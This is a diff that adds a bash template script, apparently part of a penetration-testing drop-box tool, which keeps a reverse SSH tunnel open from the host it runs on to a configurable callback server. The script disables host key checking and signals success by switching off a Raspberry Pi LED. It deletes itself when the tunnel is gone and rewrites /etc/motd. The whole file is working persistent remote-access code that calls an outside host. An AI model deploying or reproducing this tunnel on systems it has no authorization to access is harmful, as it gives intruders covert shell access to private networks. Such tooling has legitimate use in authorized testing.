@@ -1,0 +1,35 @@
+#!/bin/bash
+#title          :check_ssh.bak
+#description    :Template script used to verify that the SSH Tunnel to the callback server is up.
+#author         :Robin Lennox
+#==============================================================================
+
+randomPort=$(shuf -i 2000-65000 -n 1)
+sshUser='SET_USER'
+callbackIP='SET_IP'
+callbackPort='SET_PORT'
+tunnelType='TUNNEL_TYPE'
+gatewayWifi='GATEWAY_WIFI'
+checkSSHTunnel=$(ss -ntpa | grep 'ESTAB.*"ssh"' | grep ${callbackIP} 2>&1)
+checkRunningState=$(ps -eo command | grep "^bash" | grep check_ssh.sh | wc -l 2>&1)
+checkPortOpen=$(nc -z -v -w10 ${callbackIP} ${callbackPort} 2>&1)
+isPi='/sys/class/leds/led1/trigger'
+
+if [ "${checkRunningState}" -lt 3 ]; then
+    if [[ "${checkPortOpen}" == *"open"* ]] || [[ "${checkPortOpen}" == *"succeeded!"* ]] || [[ "${checkPortOpen}" == *"Connection to"* ]]; then
+        if [ -z "${checkSSHTunnel}" ]; then
+            ssh -f -N -R ${randomPort}:localhost:22 ${sshUser}@${callbackIP} -p${callbackPort} -oStrictHostKeyChecking=no -i SET_KEY &>/dev/null
+            # Turn Off Power LED to indicate that SSH Tunnel Created
+            if [ -f  "${isPi}" ]; then
+                sh -c 'echo gpio >/sys/class/leds/led1/trigger'
+            fi
+            echo "Tunnel Created."
+        fi
+    else
+        echo "[x] Tunnel Closed, removing check_ssh.sh."
+        rm -rf /opt/breakout/check_ssh.sh
+    fi
+else
+    echo "[x] Already check_ssh already running."
+fi
+sh /opt/breakout/templates/custom_motd.sh /etc/motd
